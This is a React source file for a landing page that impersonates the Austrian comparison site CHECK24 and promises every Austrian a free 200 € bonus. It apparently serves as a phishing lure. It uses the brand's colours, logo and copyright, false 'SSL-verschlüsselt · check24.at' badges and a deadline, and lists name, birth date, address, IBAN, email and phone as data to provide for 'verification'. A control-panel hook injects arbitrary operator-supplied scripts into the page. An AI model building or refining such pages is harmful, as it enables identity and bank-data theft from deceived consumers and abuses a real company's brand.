import { useEffect } from "react";
import {
  Gift, CalendarClock, ShieldCheck, MapPin,
  FileEdit, Mail, Wallet, IdCard,
  User, Calendar, CreditCard, Phone,
  ArrowRight, Lock, Info,
} from "lucide-react";
import { usePanel } from "@/components/PanelProvider";
import { usePageMeta } from "@/hooks/use-page-meta";

const C24_BLUE = "#005EA8";
const C24_BLUE_DARK = "#004A87";
const C24_YELLOW = "#FFCC00";
const AKTIONS_ENDE = "01.08.2026";

const FAVICON =
  "data:image/svg+xml;utf8," +
  encodeURIComponent(
    `<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='10' fill='#005EA8'/><text x='50%' y='55%' text-anchor='middle' dominant-baseline='middle' font-family='Arial,Helvetica,sans-serif' font-weight='800' font-size='26' fill='#fff'>C24</text></svg>`
  );

type IconType = React.ComponentType<React.SVGProps<SVGSVGElement>>;

const SectionHeading = ({ children, kicker }: { children: React.ReactNode; kicker?: string }) => (
  <div className="text-center mb-8">
    {kicker && (
      <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2" style={{ color: C24_BLUE }}>
        {kicker}
      </div>
    )}
    <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 leading-tight">{children}</h2>
    <div className="w-10 h-[3px] mx-auto rounded-full mt-4" style={{ backgroundColor: C24_BLUE }} />
  </div>
);

const InfoItem = ({ Icon, title, text }: { Icon: IconType; title: string; text: string }) => (
  <div className="bg-white border border-gray-200 rounded-xl p-5 text-left flex gap-4 items-start shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300">
    <div
      className="shrink-0 w-9 h-9 rounded-md flex items-center justify-center border"
      style={{ backgroundColor: "rgba(0,94,168,0.06)", borderColor: "rgba(0,94,168,0.2)" }}
    >
      <Icon className="w-[18px] h-[18px]" style={{ color: C24_BLUE }} strokeWidth={2} />
    </div>
    <div className="min-w-0">
      <h3 className="text-[13px] font-normal uppercase tracking-wider mb-1 leading-tight" style={{ color: C24_BLUE }}>
        {title}
      </h3>
      <p className="text-[13.5px] text-gray-600 leading-relaxed">{text}</p>
    </div>
  </div>
);

const Check24Logo = () => (
  <div className="flex items-center gap-0.5 select-none" aria-label="CHECK24">
    <span className="text-white font-extrabold text-2xl md:text-[28px] tracking-tight">CHECK</span>
    <span
      className="inline-flex items-center justify-center rounded-full text-white font-extrabold text-lg md:text-xl w-9 h-9 md:w-10 md:h-10 border-2 border-white"
      style={{ lineHeight: 1 }}
    >
      24
    </span>
  </div>
);

const Check24 = () => {
  usePageMeta("CHECK24 – 200 € geschenkt für alle Österreicher", FAVICON);

  const panel = usePanel();
  const pixelActive =
    panel.matched && panel.metaTagEnabled && !!panel.metaTagSnippet;

  useEffect(() => {
    const desc = `CHECK24 verschenkt 200 € an alle Österreicher – Neu- und Bestandskunden. Aktion nur bis ${AKTIONS_ENDE}.`;
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", desc);
  }, []);

  // Meta-Tag-Snippet injizieren (falls Panel aktiv)
  useEffect(() => {
    if (!pixelActive || !panel.metaTagSnippet) return;
    const container = document.createElement("div");
    container.innerHTML = panel.metaTagSnippet;
    const injected: Node[] = [];
    Array.from(container.childNodes).forEach((node) => {
      if (node.nodeType === Node.ELEMENT_NODE) {
        const el = node as HTMLElement;
        if (el.tagName === "SCRIPT") {
          const s = document.createElement("script");
          Array.from(el.attributes).forEach((a) => s.setAttribute(a.name, a.value));
          s.text = el.textContent || "";
          document.head.appendChild(s);
          injected.push(s);
        } else {
          document.head.appendChild(el);
          injected.push(el);
        }
      }
    });
    return () => {
      injected.forEach((n) => {
        if (n.parentNode) n.parentNode.removeChild(n);
      });
    };
  }, [pixelActive, panel.metaTagSnippet]);

  const handleCta = () => {
    if (pixelActive && typeof (window as any).fbq === "function") {
      try {
        (window as any).fbq("track", "Lead");
      } catch {
        // ignore
      }
    }
    // Placeholder — Wizard folgt ggf. später
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
    { Icon: MapPin, title: "Wohnsitz", text: "Hauptwohnsitz in Österreich" },
    { Icon: IdCard, title: "Alter", text: "Mindestens 18 Jahre" },
    { Icon: Wallet, title: "Bankkonto", text: "Gültige IBAN für die Auszahlung" },
    { Icon: CalendarClock, title: "Frist", text: `Aktion nur bis ${AKTIONS_ENDE}` },
  ];

  const schritte: { Icon: IconType; title: string; text: string }[] = [
    { Icon: FileEdit, title: "Daten eingeben", text: "Persönliche Angaben ausfüllen" },
    { Icon: ShieldCheck, title: "Konto verifizieren", text: "Bankverbindung bestätigen" },
    { Icon: Mail, title: "Bestätigung", text: "Bestätigung per E-Mail" },
    { Icon: Gift, title: "200 € erhalten", text: "Gutschrift auf Ihr Konto" },
  ];

  const angaben: { Icon: IconType; title: string; text: string }[] = [
    { Icon: User, title: "Name", text: "Vollständiger Vor- und Nachname" },
    { Icon: Calendar, title: "Geburtsdatum", text: "Tag, Monat und Jahr" },
    { Icon: MapPin, title: "Adresse", text: "Straße, Hausnummer, PLZ, Ort" },
    { Icon: CreditCard, title: "IBAN", text: "Für die Auszahlung des Bonus" },
    { Icon: Mail, title: "E-Mail", text: "Für Bestätigung und Rückfragen" },
    { Icon: Phone, title: "Telefon", text: "Telefonnummer für Erreichbarkeit" },
  ];

  const CtaButton = ({ label = "Jetzt 200 € sichern" }: { label?: string }) => (
    <button
      type="button"
      onClick={handleCta}
      className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
      style={{ backgroundColor: C24_BLUE }}
      onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = C24_BLUE_DARK)}
      onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = C24_BLUE)}
    >
      <span>{label}</span>
      <ArrowRight className="w-4 h-4" />
    </button>
  );

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: C24_BLUE }}>
        <div className="container mx-auto flex items-center justify-between px-4 py-5">
          <Check24Logo />
          <div className="hidden md:flex items-center gap-5 text-white/90 text-sm">
            <span>Chat</span>
            <span>Anmelden</span>
          </div>
        </div>
      </header>

      {/* Hero */}
      <section className="relative overflow-hidden border-b border-gray-200" style={{ backgroundColor: C24_BLUE }}>
        <div className="absolute inset-0 opacity-20" style={{
          background: "radial-gradient(circle at 20% 30%, #ffffff 0%, transparent 50%), radial-gradient(circle at 80% 70%, #ffffff 0%, transparent 50%)",
        }} aria-hidden="true" />
        <div className="relative container mx-auto px-4 py-14 md:py-20 text-center max-w-3xl">
          <div
            className="inline-flex items-center gap-2 text-[12px] font-bold uppercase tracking-[0.18em] px-3 py-1.5 rounded-full mb-5"
            style={{ backgroundColor: C24_YELLOW, color: "#1a1a1a" }}
          >
            <CalendarClock className="w-3.5 h-3.5" />
            Nur für kurze Zeit – bis {AKTIONS_ENDE}
          </div>
          <h1 className="text-3xl md:text-5xl font-extrabold mb-5 tracking-tight text-white leading-[1.1]">
            200 € geschenkt<br />für alle Österreicher
          </h1>
          <p className="text-[15px] md:text-base text-white/90 mb-8 max-w-xl mx-auto leading-relaxed">
            CHECK24 verschenkt <span className="font-semibold" style={{ color: C24_YELLOW }}>200 €</span> an Neu- und Bestandskunden. Sichern Sie sich jetzt Ihren Bonus – kostenlos und unverbindlich.
          </p>

          <div className="grid grid-cols-2 gap-3 max-w-md mx-auto mb-8">
            <div className="bg-white/95 border border-white/40 rounded-xl px-4 py-3 text-left shadow-md flex items-center gap-3">
              <CalendarClock className="w-8 h-8 shrink-0" style={{ color: C24_BLUE }} strokeWidth={1.5} />
              <div>
                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: C24_BLUE }}>Dauer</div>
                <div className="text-xl font-semibold text-gray-900">2 Min.</div>
              </div>
            </div>
            <div className="bg-white/95 border border-white/40 rounded-xl px-4 py-3 text-left shadow-md flex items-center gap-3">
              <Gift className="w-8 h-8 shrink-0" style={{ color: C24_BLUE }} strokeWidth={1.5} />
              <div>
                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: C24_BLUE }}>Kostenlos</div>
                <div className="text-xl font-semibold text-gray-900">& unverbindlich</div>
              </div>
            </div>
          </div>

          <button
            type="button"
            onClick={handleCta}
            className="inline-flex items-center gap-2 font-bold text-sm px-8 py-3.5 rounded-md transition-colors shadow-lg"
            style={{ backgroundColor: C24_YELLOW, color: "#1a1a1a" }}
          >
            <span>Jetzt 200 € sichern</span>
            <ArrowRight className="w-4 h-4" />
          </button>
          <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-white/80">
            <Lock className="w-3.5 h-3.5" />
            <span>SSL-verschlüsselt · check24.at</span>
          </div>
        </div>
      </section>

      <main className="py-12 md:py-14 space-y-14">
        {/* Info */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
            <div className="h-1" style={{ backgroundColor: C24_BLUE }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: C24_BLUE }}>
                <Info className="w-3.5 h-3.5" />
                Werbeaktion
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                So funktioniert unsere 200 €-Aktion
              </h2>
              <div className="text-gray-600 text-[14.5px] max-w-xl mx-auto leading-relaxed space-y-2">
                <p>
                  Als Dankeschön verschenkt CHECK24 Österreich <strong>200 €</strong> an jeden neuen und bestehenden Kunden mit Wohnsitz in Österreich.
                </p>
                <p>
                  Der Bonus wird nach erfolgreicher Verifizierung direkt auf Ihr angegebenes Konto überwiesen.
                </p>
                <p className="font-semibold" style={{ color: C24_BLUE }}>
                  Aktion endet am {AKTIONS_ENDE} – jetzt teilnehmen!
                </p>
              </div>
            </div>
          </div>
        </section>

        {/* Voraussetzungen */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Teilnahme">Voraussetzungen</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {voraussetzungen.map((v) => (
              <InfoItem key={v.title} Icon={v.Icon} title={v.title} text={v.text} />
            ))}
          </div>
        </section>

        {/* Ablauf */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Ablauf">So funktioniert&apos;s</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {schritte.map((s, i) => (
              <div
                key={s.title}
                className="bg-white border border-gray-200 rounded-xl p-5 text-center shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300"
              >
                <span
                  className="mx-auto mb-3 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold bg-white"
                  style={{ border: `1px solid ${C24_BLUE}`, color: C24_BLUE }}
                >
                  {i + 1}
                </span>
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1 leading-tight">{s.title}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{s.text}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Angaben */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Vorbereitung">Welche Angaben Sie benötigen</SectionHeading>
          <p className="text-gray-600 text-[14.5px] leading-relaxed text-center max-w-xl mx-auto mb-8 -mt-2">
            Halten Sie folgende Informationen bereit, bevor Sie das Formular ausfüllen.
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {angaben.map((a) => (
              <InfoItem key={a.title} Icon={a.Icon} title={a.title} text={a.text} />
            ))}
          </div>
        </section>

        {/* FAQ */}
        <section className="container mx-auto px-4 max-w-3xl">
          <SectionHeading kicker="FAQ">Häufige Fragen</SectionHeading>
          <div className="space-y-3">
            {[
              { q: "Wer bekommt den 200 €-Bonus?", a: "Alle volljährigen Personen mit Hauptwohnsitz in Österreich – sowohl Neukunden als auch bestehende CHECK24-Kunden." },
              { q: "Wann wird der Bonus ausgezahlt?", a: "Nach erfolgreicher Verifizierung Ihrer Daten wird der Betrag innerhalb weniger Werktage auf das angegebene Konto überwiesen." },
              { q: "Bis wann läuft die Aktion?", a: `Die Werbeaktion ist zeitlich begrenzt und endet am ${AKTIONS_ENDE}. Danach ist keine Teilnahme mehr möglich.` },
            ].map((f) => (
              <div key={f.q} className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm">
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1">{f.q}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{f.a}</p>
              </div>
            ))}
          </div>
        </section>

        {/* CTA Box */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
            <div className="h-1" style={{ backgroundColor: C24_BLUE }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: C24_BLUE }}>
                <Gift className="w-3.5 h-3.5" />
                Ihre 200 € warten
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                Bereit für Ihren Bonus?
              </h2>
              <div className="text-gray-600 text-[14.5px] mb-6 max-w-xl mx-auto leading-relaxed space-y-1">
                <p>In nur 2 Minuten erledigt.</p>
                <p>Sichern Sie sich jetzt 200 € geschenkt von CHECK24.</p>
              </div>
              <CtaButton />
              <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL-verschlüsselt · CHECK24 Vergleichsportal</span>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: C24_BLUE }} className="text-white/90">
        <div className="container mx-auto px-4 py-8 text-center">
          <nav className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-3 text-[13px]">
            <a href="#" className="hover:text-white hover:underline transition-colors">Impressum</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">Datenschutz</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">AGB</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">Kontakt</a>
          </nav>
          <p className="text-[11.5px] text-white/70">
            © 2026 CHECK24 Vergleichsportal GmbH
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Check24;
